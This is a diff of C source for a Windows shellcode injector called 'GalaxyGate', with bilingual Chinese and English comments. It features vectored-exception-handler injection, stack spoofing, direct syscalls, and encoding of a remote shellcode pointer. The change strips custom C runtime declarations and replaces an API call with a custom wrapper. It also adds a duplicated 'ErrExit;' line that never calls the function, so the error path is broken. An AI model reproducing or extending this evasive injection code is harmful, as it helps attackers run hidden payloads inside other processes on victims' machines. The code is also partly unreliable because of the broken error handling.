@@ -1,12 +1,5 @@
-﻿#include <stdio.h>
-#include <stdint.h>
-#include "syscalls.h"
-#include <stdbool.h>
-#include <wchar.h>
-#include <wctype.h>
-#include "VEHinj.h"
+﻿#include "VEHinj.h"
 #include "shellcode.h"
-
 // GalaxyGate 自研栈欺骗方案 Stack Spoof Solution
 LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo);
 NTSTATUS SFNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
@@ -32,14 +25,6 @@ PVOID FindZeroHoleInRemote(HANDLE hProcess, PVOID regionBase, SIZE_T regionSize,
 void PrintDbgA(char* message);
 void PrintDbgW(wchar_t* message);
 void ErrExit();
-
-// 自定义C运行时函数 Customized CRT Functions
-size_t SFstrlen(const char* s);
-size_t SFwcslen(const wchar_t* s);
-wchar_t* SFwcsstr(const wchar_t* haystack, const wchar_t* needle);
-int SFstrcmp(const char* a, const char* b);
-size_t __imp_wcslen(const wchar_t* s);
-size_t strlen(const char* s);
 
 FORCEINLINE VOID SFRtlInitUnicodeString( // 使用自定义wcslen的RtlInitUnicodeString宏 其余一致
 	_Out_ PUNICODE_STRING DestinationString,
@@ -136,9 +121,9 @@ void InjectorEntry() {
 
 	// 编码Shellcode指针
 	PVOID encodedShellcodePointer = NULL;
-	status = RtlEncodeRemotePointer(hProcess, shellcodeAddress, &encodedShellcodePointer);
-	if (status != 0) { // 即!=NT_SUCCESS
+	if(!SFRtlEncodeRemotePointer(hProcess, shellcodeAddress, &encodedShellcodePointer)) {
 		PrintDbgW(L"[-] 编码Shellcode指针失败 | Failed to encode shellcode pointer\n");
+		ErrExit;
 		ErrExit;
 	}
 
